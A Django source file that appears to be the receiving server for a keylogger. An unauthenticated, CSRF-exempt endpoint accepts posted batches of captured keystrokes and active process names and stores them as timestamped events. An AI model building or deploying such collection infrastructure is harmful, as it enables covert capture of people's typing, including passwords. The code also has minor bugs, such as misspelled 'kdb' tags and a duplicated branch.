import json
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt
import re
import datetime
import api.models as models
from django.utils import timezone


def get_processes(raw_data: str):
    # format: get all processes inside a string that are in the format of "<process_name,...,process_name>...<...>"
    # return a list of all subsets of processes
    array = []
    processes_list = re.findall(r'<(.*?)>', raw_data)
    for processes in processes_list:
        array.append(processes.split(','))
    return array


def translate_key(key: str):
    if key == "RShiftKey" or key == "LShiftKey":
        return "<kdb>Shift</kdb>"
    elif key == "RControlKey" or key == "LControlKey":
        return "<kdb>Ctrl</kdb>"
    elif key == "RMenu" or key == "LMenu":
        return "<kdb>Alt</kdb>"
    elif key == "RWin" or key == "LWin":
        return "<kdb>Win</kdb>"
    elif key == "RAlt" or key == "LAlt":
        return "<kdb>Alt</kdb>"
    elif key == "RShift" or key == "LShift":
        return "<kdb>Shift</kdb>"
    elif key == "RControl" or key == "LControl":
        return "<kdb>Ctrl</kdb>"
    elif key == "RMenu" or key == "LMenu":
        return "<kdb>Alt</kdb>"
    elif key == "Return":
        return "<kdb>Enter</kdb>"
    elif key == "Escape":
        return "<kdb>Esc</kdb>"
    elif key == "Oemplus":
        return "<kdb>+</kdb>"
    return "<kbd>{}</kbd>".format(key)


def get_content(raw_data: str):
    # format: string that contains all events logged "asdasdasd<process_name,...>[key]..."
    # return string where all key are replaced with value
    processes_list = re.findall(r'<(.*?)>', raw_data)
    cont = 1
    for processes in processes_list:
        raw_data = raw_data.replace("<" + processes + ">", "<p>processes_{}<p>".format(cont))
        cont += 1
    key_to_replace = re.findall(r'\[(.*?)\]', raw_data)
    for key in key_to_replace:
        raw_data = raw_data.replace("[" + key + "]", translate_key(key))
    return raw_data


@csrf_exempt
def log(request):
    if request.method != 'POST':
        return HttpResponse(status=404)
    # Request data are in json format
    data = json.load(request)
    print(data['key'])
    key = models.LoggerKey.objects.get(key=data['key'])
    lines = data['content'].split(' $ ')
    for line in lines:
        time, raw_data = line.split(' | ')
        # format timestamp %d/%m/%Y %H:%M:%S to YYYY-MM-DD HH:MM
        timestamp = datetime.datetime.strptime(time, '%d/%m/%Y %H:%M:%S')
        processes = get_processes(raw_data)
        content = get_content(raw_data)
        models.Event.objects.create(
            logger_key=key,
            timestamp=timestamp,
            content=json.dumps(content),
            processes=json.dumps(processes),
        )
    return HttpResponse(status=200)
